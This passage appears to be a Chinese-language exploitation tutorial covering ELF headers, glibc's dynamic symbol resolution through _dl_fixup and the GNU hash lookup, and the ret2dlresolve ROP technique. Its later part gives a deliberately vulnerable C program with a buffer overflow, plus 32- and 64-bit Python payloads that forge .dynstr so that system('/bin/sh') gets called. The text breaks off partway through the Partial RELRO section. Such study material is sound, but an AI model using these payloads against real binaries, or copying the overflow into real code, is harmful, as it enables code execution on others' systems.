<code>e_shoff</code> 分别存储了 Program Header Table 和 Section Header Table 的偏移，<code>e_phentsize</code> 和 <code>e_shentsize</code> 分别存储了 Program Header Table 和 Section Header Table 的结构体大小，<code>e_phnum</code> 和 <code>e_shnum</code> 分别存储了 Program Header Table 和 Section Header Table 中 Header 的数量：</p><pre><code class="cpp">typedef struct{  unsigned char        e_ident[EI_NIDENT];        /* Magic number and other info */  Elf32_Half        e_type;                        /* Object file type */  Elf32_Half        e_machine;                /* Architecture */  Elf32_Word        e_version;                /* Object file version */  Elf32_Addr        e_entry;                /* Entry point virtual address */  Elf32_Off        e_phoff;                /* Program header table file offset */  Elf32_Off        e_shoff;                /* Section header table file offset */  Elf32_Word        e_flags;                /* Processor-specific flags */  Elf32_Half        e_ehsize;                /* ELF header size in bytes */  Elf32_Half        e_phentsize;                /* Program header table entry size */  Elf32_Half        e_phnum;                /* Program header table entry count */  Elf32_Half        e_shentsize;                /* Section header table entry size */  Elf32_Half        e_shnum;                /* Section header table entry count */  Elf32_Half        e_shstrndx;                /* Section header string table index */} Elf32_Ehdr;typedef struct{  unsigned char        e_ident[EI_NIDENT];        /* Magic number and other info */  Elf64_Half        e_type;                        /* Object file type */  Elf64_Half        e_machine;                /* Architecture */  Elf64_Word        e_version;                /* Object file version */  Elf64_Addr        e_entry;                /* Entry point virtual address */  Elf64_Off        e_phoff;                /* Program header table file offset */  Elf64_Off        e_shoff;                /* Section header table file offset */  Elf64_Word        e_flags;                /* Processor-specific flags */  Elf64_Half        e_ehsize;                /* ELF header size in bytes */  Elf64_Half        e_phentsize;                /* Program header table entry size */  Elf64_Half        e_phnum;                /* Program header table entry count */  Elf64_Half        e_shentsize;                /* Section header table entry size */  Elf64_Half        e_shnum;                /* Section header table entry count */  Elf64_Half        e_shstrndx;                /* Section header string table index */} Elf64_Ehdr;</code></pre><p>Section Header Table 是一个 <code>Elf64_Shdr</code>（<code>Elf32_Shdr</code>）的数组（程序执行时一般没有 Section Header Table），指出每个 Section 的地址：</p><pre><code class="cpp">/* Section header.  */typedef struct{  Elf32_Word        sh_name;                /* Section name (string tbl index) */  Elf32_Word        sh_type;                /* Section type */  Elf32_Word        sh_flags;                /* Section flags */  Elf32_Addr        sh_addr;                /* Section virtual addr at execution */  Elf32_Off        sh_offset;                /* Section file offset */  Elf32_Word        sh_size;                /* Section size in bytes */  Elf32_Word        sh_link;                /* Link to another section */  Elf32_Word        sh_info;                /* Additional section information */  Elf32_Word        sh_addralign;                /* Section alignment */  Elf32_Word        sh_entsize;                /* Entry size if section holds table */} Elf32_Shdr;typedef struct{  Elf64_Word        sh_name;                /* Section name (string tbl index) */  Elf64_Word        sh_type;                /* Section type */  Elf64_Xword        sh_flags;                /* Section flags */  Elf64_Addr        sh_addr;                /* Section virtual addr at execution */  Elf64_Off        sh_offset;                /* Section file offset */  Elf64_Xword        sh_size;                /* Section size in bytes */  Elf64_Word        sh_link;                /* Link to another section */  Elf64_Word        sh_info;                /* Additional section information */  Elf64_Xword        sh_addralign;                /* Section alignment */  Elf64_Xword        sh_entsize;                /* Entry size if section holds table */} Elf64_Shdr;</code></pre><p>Program Header Table 是一个 <code>Elf64_Phdr</code>（<code>Elf32_Phdr</code>）的数组，指定数据以及其在内存中的位置，即某个范围会被加载到哪个地址（Segment 包含多个 Section）：</p><pre><code class="cpp">/* Program segment header.  */typedef struct{  Elf32_Word        p_type;                        /* Segment type */  Elf32_Off        p_offset;                /* Segment file offset */  Elf32_Addr        p_vaddr;                /* Segment virtual address */  Elf32_Addr        p_paddr;                /* Segment physical address */  Elf32_Word        p_filesz;                /* Segment size in file */  Elf32_Word        p_memsz;                /* Segment size in memory */  Elf32_Word        p_flags;                /* Segment flags */  Elf32_Word        p_align;                /* Segment alignment */} Elf32_Phdr;typedef struct{  Elf64_Word        p_type;                        /* Segment type */  Elf64_Word        p_flags;                /* Segment flags */  Elf64_Off        p_offset;                /* Segment file offset */  Elf64_Addr        p_vaddr;                /* Segment virtual address */  Elf64_Addr        p_paddr;                /* Segment physical address */  Elf64_Xword        p_filesz;                /* Segment size in file */  Elf64_Xword        p_memsz;                /* Segment size in memory */  Elf64_Xword        p_align;                /* Segment alignment */} Elf64_Phdr;</code></pre><h3 id="Dynamic-Section"><a href="#Dynamic-Section" class="headerlink" title="Dynamic Section"></a>Dynamic Section</h3><p><code>.dynamic</code> 是一个 <code>Elf64_Dyn</code>（<code>Elf32_Dyn</code>）数组，是解析 Symbol 时最重要的一个 Section。执行时可以根据 Program Header Table，找出 <code>p_type</code> 值为 <code>PT_DYNAMIC</code> 的 Program Header。Program Header Table 的基址加上 <code>p_offset</code> 的结果就是 <code>.dynamic</code> 的地址。其中的 <code>union</code> 里用 <code>d_val</code> 还是 <code>d_ptr</code> 取决于 <code>d_tag</code>（<code>DT_xxx</code>）：</p><pre><code class="cpp">/* Dynamic section entry.  */typedef struct{  Elf32_Sword        d_tag;                        /* Dynamic entry type */  union    {      Elf32_Word d_val;                        /* Integer value */      Elf32_Addr d_ptr;                        /* Address value */    } d_un;} Elf32_Dyn;typedef struct{  Elf64_Sxword        d_tag;                        /* Dynamic entry type */  union    {      Elf64_Xword d_val;                /* Integer value */      Elf64_Addr d_ptr;                        /* Address value */    } d_un;} Elf64_Dyn;</code></pre><h4 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a><code>.dynsym</code></h4><p><code>.dynsym</code> 是 <code>.dynamic</code> 中 <code>d_tag</code> 为 <code>DT_SYMTAB</code> 的 entry，<code>d_ptr</code> 指向 <code>.dynsym</code> Section（<code>Elf64_Sym</code> 或 <code>Elf32_Sym</code> 数组）。其中 <code>st_name</code> 指向 Symbol Name：</p><pre><code class="cpp">/* Symbol table entry.  */typedef struct{  Elf32_Word        st_name;                /* Symbol name (string tbl index) */  Elf32_Addr        st_value;                /* Symbol value */  Elf32_Word        st_size;                /* Symbol size */  unsigned char        st_info;                /* Symbol type and binding */  unsigned char        st_other;                /* Symbol visibility */  Elf32_Section        st_shndx;                /* Section index */} Elf32_Sym;typedef struct{  Elf64_Word        st_name;                /* Symbol name (string tbl index) */  unsigned char        st_info;                /* Symbol type and binding */  unsigned char st_other;                /* Symbol visibility */  Elf64_Section        st_shndx;                /* Section index */  Elf64_Addr        st_value;                /* Symbol value */  Elf64_Xword        st_size;                /* Symbol size */} Elf64_Sym;</code></pre><h4 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a><code>.dynstr</code></h4><p><code>.dynstr</code> 是 <code>.dynamic</code> 中 <code>d_tag</code> 为 <code>DT_STRTAB</code> 的 entry，是 <code>.dynsym</code> 中 <code>st_name</code> 对应的字符串表（<code>name = (char *)(.dynstr+.dynsym[xx]-&gt;st_name)</code>）。</p><h4 id="rel-plt（-rela-plt）"><a href="#rel-plt（-rela-plt）" class="headerlink" title=".rel.plt（.rela.plt）"></a><code>.rel.plt</code>（<code>.rela.plt</code>）</h4><p><code>.rel.plt</code>（<code>.rela.plt</code>）是 <code>.dynamic</code> 中 <code>d_tag</code> 为 <code>DT_JMPREL</code> 的 entry，对应的结构体是 <code>Elf64_Rela</code>（<code>Elf32_Rel</code>）。<code>XX_Rela</code> 相比 <code>XX_Rel</code> 多了一个没什么用处的 <code>r_addend</code>，测试的时候发现 32 位程序用的是 <code>Elf32_Rel</code>，而 64 位程序用的是 <code>Elf64_Rela</code>。<code>r_offset</code> 为需要重定位的地址的偏移，即 <code>.got.plt</code>（GOT）；<code>r_info</code> 中包含 Symbol Index（Symbol Index 即为 <code>.dynsym</code> 中的 Section Index）。<code>ELF64_R_SYM</code>（<code>#define ELF64_R_SYM(i) ((i) &gt;&gt; 32)</code>）用来取高 32bit；<code>ELF32_R_SYM</code>（<code>#define ELF32_R_SYM(val) ((val) &gt;&gt; 8)</code>）用来取高 24bit：</p><pre><code class="cpp">/* Relocation table entry without addend (in section of type SHT_REL).  */typedef struct{  Elf32_Addr        r_offset;                /* Address */  Elf32_Word        r_info;                        /* Relocation type and symbol index */} Elf32_Rel;/* I have seen two different definitions of the Elf64_Rel and   Elf64_Rela structures, so we&#39;ll leave them out until Novell (or   whoever) gets their act together.  *//* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */typedef struct{  Elf64_Addr        r_offset;                /* Address */  Elf64_Xword        r_info;                        /* Relocation type and symbol index */} Elf64_Rel;/* Relocation table entry with addend (in section of type SHT_RELA).  */typedef struct{  Elf32_Addr        r_offset;                /* Address */  Elf32_Word        r_info;                        /* Relocation type and symbol index */  Elf32_Sword        r_addend;                /* Addend */} Elf32_Rela;typedef struct{  Elf64_Addr        r_offset;                /* Address */  Elf64_Xword        r_info;                        /* Relocation type and symbol index */  Elf64_Sxword        r_addend;                /* Addend */} Elf64_Rela;</code></pre><h2 id="Symbol-Resolve"><a href="#Symbol-Resolve" class="headerlink" title="Symbol Resolve"></a>Symbol Resolve</h2><p>接下来看程序是怎么解 Symbol 的。在 Symbol 还没有没解析好的时候，PLT 中的第一条指令会 JMP 到 GOT，而 GOT 原本的值是 PLT 中的第二条指令（<code>XX@plt+6</code>）；第二条指令 <code>PUSH reloc_arg</code>（如果用 <code>.rel.plt</code> 则 <code>reloc_arg</code> 是 <code>offset</code>；如果是 <code>rela.plt.</code> 则是 <code>index</code>）；第三条指令 JMP 至 PLT 中的第一行（<code>PLT0</code>）。</p><p>接下来在 <code>PLT0</code> 中，第一条指令 <code>PUSH GOT1</code> 把 <code>link_map</code> 结构体入栈（64 位在调用 <code>_dl_fixup()</code> 之前会把栈上的 <code>link_map</code> 和 <code>reloc_arg</code> 分别复制给 rdi 和 rsi）；第二条指令 <code>JMP GOT2</code> 来跳转到 Dynamic Resolver 来寻找 Symbol（即跳转到 <code>_dl_runtime_resolve()</code>）</p><h3 id="dl-runtime-resolve"><a href="#dl-runtime-resolve" class="headerlink" title="_dl_runtime_resolve()"></a><code>_dl_runtime_resolve()</code></h3><p><code>_dl_runtime_resolve()</code> 函数是 Symbol 的解析器，它将 <code>link_map</code> 和 <code>reloc_arg</code> 作为参数传入 <code>_dl_fixup()</code>，并在 <code>_dl_fixup()</code> 中获取 Symbol Name，在 Library 中找到对应的地址并填入 GOT。解析成功后，程序会直接跳转到解出的函数地址。</p><p>Resolver 先根据 reloc_arg 定位到 <code>.rel.plt</code>（<code>.rela.plt</code>），然后根据 <code>r_info</code> 找到对应的 Symbol Name，并获取在 Library 中的地址，然后根据 <code>r_offset</code> 找到 GOT，并将获得的地址填入 GOT。查找函数的过程如下：</p><pre><code>_dl_runtime_resolve(link_map, reloc_arg)            __________            |           |Elf64_Rela| &lt;---------+           |----------|      +--- | r_offset |         ___________      |    |  r_info  | -----&gt; | Elf64_Sym |          ____________      |    |__________|        |-----------|         |            |      |                        |  st_name  | ------&gt; | printf\x00 |      |      .rel.plt          |___________|         |____________|      v  __________                     .dynsym                .dynstr |          | | &lt;printf&gt; | |__________|   .got.plt</code></pre><p>其中 <code>link_map</code> 中包括了所有已加载的 ELF 信息。</p><h4 id="link-map"><a href="#link-map" class="headerlink" title="link_map"></a><code>link_map</code></h4><p><code>link_map</code> 结构体在 <a href="https://code.woboq.org/userspace/glibc/include/link.h.html" target="_blank" rel="noopener"><code>glibc/include/link.h</code></a> 中实现。其中，<code>l_next</code> 作为指针连接所有载入的 Library；<code>l_name</code> 存储了 Library 的名字；<code>l_addr</code> 中存储了该 Library 的基址；<code>l_info[x]</code> 则指向 <code>.dynamic</code> 中的数据，<code>x</code> 即为 <code>d_tag</code>，可以用来获取 Library 中的指定 Section：</p><pre><code class="cpp">/* Structure describing a loaded shared object.  The `l_next&#39; and `l_prev&#39;   members form a chain of all the shared objects loaded at startup.   These data structures exist in space used by the run-time dynamic linker;   modifying them may have disastrous results.   This data structure might change in future, if necessary.  User-level   programs must avoid defining objects of this type.  */struct link_map  {    /* These first few members are part of the protocol with the debugger.       This is the same format used in SVR4.  */    ElfW(Addr) l_addr;                /* Difference between the address in the ELF                                   file and the addresses in memory.  */    char *l_name;                /* Absolute file name object was found in.  */    ElfW(Dyn) *l_ld;                /* Dynamic section of the shared object.  */    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */    /* All following members are internal to the dynamic linker.       They may change without notice.  */    /* This is an element which is only ever different from a pointer to       the very same copy of this type for ld.so when it is used in more       than one namespace.  */    struct link_map *l_real;    /* Number of the namespace this link map belongs to.  */    Lmid_t l_ns;    struct libname_list *l_libname;    /* Indexed pointers to dynamic section.       [0,DT_NUM) are indexed by the processor-independent tags.       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are       indexed by DT_VERSIONTAGIDX(tagvalue).       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by       DT_EXTRATAGIDX(tagvalue).       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are       indexed by DT_VALTAGIDX(tagvalue) and       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM                      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];    const ElfW(Phdr) *l_phdr;        /* Pointer to program header table in core.  */    ElfW(Addr) l_entry;                /* Entry point location.  */    ElfW(Half) l_phnum;                /* Number of program header entries.  */    ElfW(Half) l_ldnum;                /* Number of dynamic segment entries.  */    ...    /* Pointer to the version information if available.  */    ElfW(Versym) *l_versyms;    ...  };</code></pre><h4 id="dl-fixup"><a href="#dl-fixup" class="headerlink" title="_dl_fixup()"></a><code>_dl_fixup()</code></h4><p><code>_dl_fixup()</code> 在 <a href="https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html" target="_blank" rel="noopener">dl-runtime.c</a> 中实现。通过 <code>reloc_arg</code> 在 <code>link_map</code> 中获取相应的 <code>symtab</code>（<code>.dynsym</code> 数组）、<code>strtab</code>（<code>.dynstr</code>）、<code>reloc</code>（<code>.rel.plt</code> 或 <code>.rela.plt</code>）、<code>sym</code>（根据 <code>reloc</code> 中的 <code>r_info</code> 得到对应的 <code>.dynsym</code> 元素）。然后会有一系列的检查，通过检查后根据 <code>strtab + sym-&gt;st_name</code> 的 Symbol Name 查找到对应的地址，最后填入 GOT：</p><pre><code class="cpp">/* This function is called through a special trampoline from the PLT the   first time each PLT entry is called.  We must perform the relocation   specified in the PLT of the given shared object, and return the resolved   function address to the trampoline, which will restart the original call   to that address.  Future calls will bounce directly from the PLT to the   function.  */DL_FIXUP_VALUE_TYPE__attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE_dl_fixup (# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS       ELF_MACHINE_RUNTIME_FIXUP_ARGS,# endif       struct link_map *l, ElfW(Word) reloc_arg){  const ElfW(Sym) *const symtab    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);  // 通过reloc_arg计算重定位入口，JMPREL即.rel.plt，reloc_offset在32位下为reloc_arg（64位下为reloc_arg * sizeof (PLTREL)）  const PLTREL *const reloc    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);  // 通过reloc-&gt;r_info找到.dynsym中对应的部分  const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);  lookup_t result;  DL_FIXUP_VALUE_TYPE value;  // 检查reloc-&gt;r_info的最低位是不是ELF_MACHINE_JMP_SLOT（7，表示这是一个PLT）  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);  // 检查version  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)    {      const struct r_found_version *version = NULL;      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)    {      const ElfW(Half) *vernum =        (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);      ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;      version = &amp;l-&gt;l_versions[ndx];      if (version-&gt;hash == 0)        version = NULL;    }      /* We need to keep the scope around so do some locking.  This is     not necessary for objects which cannot be unloaded or when     we are not using any threads (yet).  */      int flags = DL_LOOKUP_ADD_DEPENDENCY;      if (!RTLD_SINGLE_THREAD_P)    {      THREAD_GSCOPE_SET_FLAG ();      flags |= DL_LOOKUP_GSCOPE_LOCK;    }#ifdef RTLD_ENABLE_FOREIGN_CALL      RTLD_ENABLE_FOREIGN_CALL;#endif      // 通过strtab + sym-&gt;st_name找到符号表字符串，result为libc基地址      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,                    version, ELF_RTYPE_CLASS_PLT, flags, NULL);      /* We are done with the global scope.  */      if (!RTLD_SINGLE_THREAD_P)    THREAD_GSCOPE_RESET_FLAG ();#ifdef RTLD_FINALIZE_FOREIGN_CALL      RTLD_FINALIZE_FOREIGN_CALL;#endif      // 找到了对应的.dynsym后，Library基址加上st_value的结果即为函数地址      value = DL_FIXUP_MAKE_VALUE (result,                   sym ? (LOOKUP_VALUE_ADDRESS (result)                      + sym-&gt;st_value) : 0);    }  else    {      // 如果Symbol已经找到了      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);      result = l;    }  // value为libc基址加上要解析函数的偏移地址，即实际地址  value = elf_machine_plt_value (l, reloc, value);  if (sym != NULL      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0))    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));  /* Finally, fix up the plt itself.  */  if (__builtin_expect (GLRO(dl_bind_not), 0))    return value;  // 把value写入对应的GOT中  return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);}</code></pre><h5 id="dl-lookup-symbol-x-（-dl-lookup-x-）"><a href="#dl-lookup-symbol-x-（-dl-lookup-x-）" class="headerlink" title="_dl_lookup_symbol_x()（_dl_lookup_x()）"></a><code>_dl_lookup_symbol_x()</code>（<code>_dl_lookup_x()</code>）</h5><p><code>_dl_lookup_symbol_x()</code> 以及 <code>_dl_lookup_x()</code> 在 <a href="https://code.woboq.org/userspace/glibc/elf/dl-lookup.c.html" target="_blank" rel="noopener"><code>glibc/elf/dl-look-up.c</code></a> 中实现。其中根据 <code>strtab + sym-&gt;st_name</code> 来查找符号表。理论上可以通过遍历 <code>.dynsym</code> 中的每个元素的 <code>st_name</code> 来获取 <code>.dynstr</code> 中对应的字符串，并和传入的 Symbol Name 进行比较，但这样的时间复杂度就会很高。<code>_dl_lookup_symbol_x()</code> 中则通过哈希表（GNU Hash）来进行查找：</p><pre><code class="cpp">static uint_fast32_tdl_new_hash (const char *s){  uint_fast32_t h = 5381;  for (unsigned char c = *s; c != &#39;\0&#39;; c = *++s)    h = h * 33 + c;  return h &amp; 0xffffffff;}</code></pre><p>可以用 Python 实现这个函数：</p><pre><code class="python">In [1]: def dl_new_hash(s):   ...:   h = 5381   ...:   for c in s:   ...:     h = 33 * h + ord(c)   ...:   return h &amp; 0xffffffff   ...:In [2]: hex(dl_new_hash(&#39;__isoc99_scanf&#39;))Out[2]: &#39;0xeafe348dL&#39;</code></pre><p><code>_dl_lookup_symbol_x()</code> 中，先会调用 <code>dl_new_hash()</code> 来计算 Symbol Name 的哈希值，然后调用 <code>do_lookup_x()</code> 来查找对应的 Symbol：</p><pre><code class="cpp">/* Search loaded objects&#39; symbol tables for a definition of the symbol   UNDEF_NAME, perhaps with a requested version for the symbol.   We must never have calls to the audit functions inside this function   or in any function which gets called.  If this would happen the audit   code might create a thread which can throw off all the scope locking.  */lookup_tinternal_function_dl_lookup_symbol_x (const char *undef_name, struct link_map *undef_map,             const ElfW(Sym) **ref,             struct r_scope_elem *symbol_scope[],             const struct r_found_version *version,             int type_class, int flags, struct link_map *skip_map){  const uint_fast32_t new_hash = dl_new_hash (undef_name); // 获取Symbol Name的哈希  unsigned long int old_hash = 0xffffffff;  struct sym_val current_value = { NULL, NULL };  struct r_scope_elem **scope = symbol_scope;  ...  /* Search the relevant loaded objects for a definition.  */  for (size_t start = i; *scope != NULL; start = 0, ++scope)    {      int res = do_lookup_x (undef_name, new_hash, &amp;old_hash, *ref,                 &amp;current_value, *scope, start, version, flags,                 skip_map, type_class, undef_map);      if (res &gt; 0)    break;  ...  *ref = current_value.s;  return LOOKUP_VALUE (current_value.m);}</code></pre><p>在 <code>do_lookup_x()</code> 中有一个大循环，主要是根据 Symbol Name 的哈希值模 <code>l_nbuckets</code> 作为下标，从 <code>l_gnu_buckets</code> 中获取一个 <code>bucket</code>。然后根据 bucket 从 <code>l_gnu_chain_zero</code> 取出一个哈希值来进行比较，如果正确，那么当前的 <code>bucket</code> 的值就是目标 <code>.dynsym</code> 的下标；如果不正确，将 <code>bucket</code> 的值加 1。最后返回 Symbol Name 对应的 <code>.dynsym</code>：</p><pre><code class="cpp">/* Inner part of the lookup functions.  We return a value &gt; 0 if we   found the symbol, the value 0 if nothing is found and &lt; 0 if   something bad happened.  */static int__attribute_noinline__do_lookup_x (const char *undef_name, uint_fast32_t new_hash,         unsigned long int *old_hash, const ElfW(Sym) *ref,         struct sym_val *result, struct r_scope_elem *scope, size_t i,         const struct r_found_version *const version, int flags,         struct link_map *skip, int type_class, struct link_map *undef_map){  size_t n = scope-&gt;r_nlist;  /* Make sure we read the value before proceeding.  Otherwise we     might use r_list pointing to the initial scope and r_nlist being     the value after a resize.  That is the only path in dl-open.c not     protected by GSCOPE.  A read barrier here might be to expensive.  */  __asm volatile (&quot;&quot; : &quot;+r&quot; (n), &quot;+m&quot; (scope-&gt;r_list));  struct link_map **list = scope-&gt;r_list;  do    {  ...      /* The tables for this map.  */      const ElfW(Sym) *symtab = (const void *) D_PTR (map, l_info[DT_SYMTAB]);      const char *strtab = (const void *) D_PTR (map, l_info[DT_STRTAB]);  ...      if (__builtin_expect (bitmask != NULL, 1))    {      ElfW(Addr) bitmask_word        = bitmask[(new_hash / __ELF_NATIVE_CLASS)              &amp; map-&gt;l_gnu_bitmask_idxbits];      unsigned int hashbit1 = new_hash &amp; (__ELF_NATIVE_CLASS - 1);      unsigned int hashbit2 = ((new_hash &gt;&gt; map-&gt;l_gnu_shift)                   &amp; (__ELF_NATIVE_CLASS - 1));      if (__builtin_expect ((bitmask_word &gt;&gt; hashbit1)                &amp; (bitmask_word &gt;&gt; hashbit2) &amp; 1, 0))        {        // 从l_gnu_buckets中获取一个bucket          Elf32_Word bucket = map-&gt;l_gnu_buckets[new_hash                             % map-&gt;l_nbuckets];          if (bucket != 0)        {      // 从l_gnu_chain_zero取出一个哈希值          const Elf32_Word *hasharr = &amp;map-&gt;l_gnu_chain_zero[bucket];          do            if (((*hasharr ^ new_hash) &gt;&gt; 1) == 0) // 比较哈希值              {            symidx = hasharr - map-&gt;l_gnu_chain_zero;            sym = check_match (&amp;symtab[symidx]);            if (sym != NULL)              goto found_it;              }          while ((*hasharr++ &amp; 1u) == 0);        }        }      /* No symbol found.  */      symidx = SHN_UNDEF;    }  ...    }  /* We have not found anything until now.  */  return 0;}</code></pre><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>根据上面的分析，基本上可以得出 Dynamic Resolver 进行解析 Symbol 的过程：</p><ul><li>根据 <code>reloc_arg</code> 加载 Symbol Name</li><li>根据 <code>link_map</code> 中依次在每个 Library 中找 Symbol</li><li>计算 Symbol 的 Hash</li><li>用 Bloom Filter 检查 Symbol 是否存在（不是很重要）</li><li>在 Hash Bucket 和 Chain 中找 Symbol，若 <code>st_name</code> 符合则找到</li><li>检查 <code>version</code> 是否正确（不太重要）</li><li>填写 GOT 并回传 Symbol 的地址</li></ul><p>而 DynELF 的功能其实就是在干 Dynamic Resolver 的工作，它没有采用 GNU Hash 的方法来查找，而是使用了一个一个找 <code>.dynsym</code> 的方式来定位想要的函数。</p><h1 id="Return-to-Dynamic-Resolver"><a href="#Return-to-Dynamic-Resolver" class="headerlink" title="Return to Dynamic Resolver"></a>Return to Dynamic Resolver</h1><p>一种根据 Dynamic Resolver 的工作原理来实现的 ROP 技术。通过构造传给 <code>_dl_runtime_resolve</code> 的参数，让 <code>_dl_fixup</code> 解析出我们要的 Symbol：</p><ul><li>参数通过栈传递，x86 和 x64 都可以使用</li><li>可以直接 CALL PLT0，这样就只需要传 <code>reloc_arg</code></li><li>需要控制 <code>link_map</code> 的时候可以 JMP PLT0 的第二条指令</li><li>不需要泄漏信息和 libc 版本，百分之百稳定 get shell</li></ul><h2 id="What-is-RELRO"><a href="#What-is-RELRO" class="headerlink" title="What is RELRO"></a>What is RELRO</h2><p>Relocation Read Only（RELRO）保护有不同等级，利用的方法和复杂程度不同：</p><ul><li>No RELRO：所有相关的数据部分都能写</li><li>Partial RELRO（gcc 默认设定的值）：<code>.dynamic</code>、<code>.dynsym</code>、<code>.dynstr</code> 等部分只读</li><li>Full RELRO：所有的 Symbol 在加载时都解析完成，GOT 只读，没有 <code>link_map</code> 和 Dynamic Resolver 的指针可以利用</li></ul><p>下面根据三种情况分析不同的攻击方法。程序源码如下：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;char buf[1000000];int main() {    char local[10];//    write(1, &quot;&gt; &quot;, 2); // 32位下可以在没有泄漏的情况下实现，64位下可能需要泄漏    int len = read(0, buf, sizeof(buf));    memcpy(local, buf, len);    return 0;}</code></pre><h2 id="No-RELRO"><a href="#No-RELRO" class="headerlink" title="No RELRO"></a>No RELRO</h2><p>直接伪造 <code>.dynstr</code>，通过 <code>readelf</code> 找到 <code>.dynamic</code> 中 <code>DT_STRTAB</code> 的位置，把原本的 <code>.dynstr</code> 指向可控制的内存（在上面放 <code>&quot;system\x00&quot;</code>），然后跳到一个还没有解析过的 Symbol 上，如 <code>__gmon_start__</code>。这种方法只能在 No RELRO 的情况下使用。32 位下可以构造如下 payload：</p><pre><code class="python">def memcpy(dst, src, length):    return p32(memcpy_plt) + p32(pop3_ret) + p32(dst) + p32(src) + p32(length)st_name = 0x38payload = (    ((        &#39;A&#39; * 18 + # padding        p32(buf + 1024 + 4) # set esp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        memcpy(dynstr_addr + 4, buf + 2048, 4) +        p32(gmon_start_plt) +        p32(0xdeadbeef) +        p32(buf + 2048 + 12) # &amp;&quot;/bin/sh\x00&quot;    ).ljust(2048, &#39;\x00&#39;) +  # buf+2048    p32(buf + 2048 + 4 - st_name) + # set strtab=&amp;&quot;system\x00&quot;    &#39;system\x00\x00&#39; +    &#39;/bin/sh\x00&#39;)</code></pre><p>64 位下同理：</p><pre><code class="python">def csu(func, rdi, rsi, rdx):  payload = (        p64(0x40066a) + p64(0) + p64(1) + p64(func) + p64(rdx) + p64(rsi) + p64(rdi) +        p64(0x400650) + 56 * &#39;\x00&#39;  )  return payloaddef memcpy(dst, src, length):    return csu(memcpy_got, dst, src, length)payload = (    ((        &#39;A&#39; * 14 + # padding        p64(buf + 1024 - 8) + # set rbp=buf+1024-8        p64(leave_ret) # stack pivot ; set rsp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        memcpy(dynstr_addr + 8, buf + 2048, 8) +        p64(pop_rdi_ret) +        p64(buf + 2048 + 16) +        p64(gmon_start_plt)    ).ljust(2048, &#39;\x00&#39;) + # buf+2048    p64(buf + 2048 + 8 - st_name) + # set strtab=&amp;&quot;system\x00&quot;    &#39;system\x00\x00&#39; +    &#39;/bin/sh\x00&#39;)</code></pre><h2 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h2><p>构造一个假的 <code>Elf32_Rel</code>（<code>Elf64_Rela</code>），使 <code>r_offset</code> 在可写位置，<code>r_info</code> 使 <code>&amp;.dynsym[r_info&gt;&gt;8]</code>（64 位下是 <code>&amp;.dynsym[r_info&gt;&gt;32]</code>）可控。然后传一个特别大的 <code>reloc_arg</code> 进去，使 <code>.rel.plt+reloc_arg</code> 落在假的 <code>Elf32_Rel</code>（<code>Elf64_Rela</code>）上。接着构造一个假的 <code>Elf32_Sym</code>（<code>Elf64_Sym</code>），其中构造 <code>st_name</code> 使 <code>.dynstr+st_name</code> 可控（放上 <code>&quot;system\x00&quot;</code>）</p><p>如果可控的内存地址和 Section 相反或距离太远而无法使用（基本上 64 位会有这个问题），需要让 <code>reloc_arg</code>、<code>r_info</code>、<code>st_name</code> 的参数可以放进这块内存。其中 <code>.gnu.version[r_info&gt;&gt;8]</code> 要为 0，或者把 <code>l_info[VERSYMIDX (DT_VERSYM)]</code> 中的内容清空。由于我们构造的伪 Symbol 中的 <code>r_info</code> 过大，使得 <code>vernum[ELFW(R_SYM) (reloc-&gt;r_info)]</code> 读取出错，如果 <code>l-&gt;l_info[VERSYMIDX (DT_VERSYM)]</code> 的值为 NULL 就不会出错，如下：</p><pre><code class="cpp">      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)        {          const 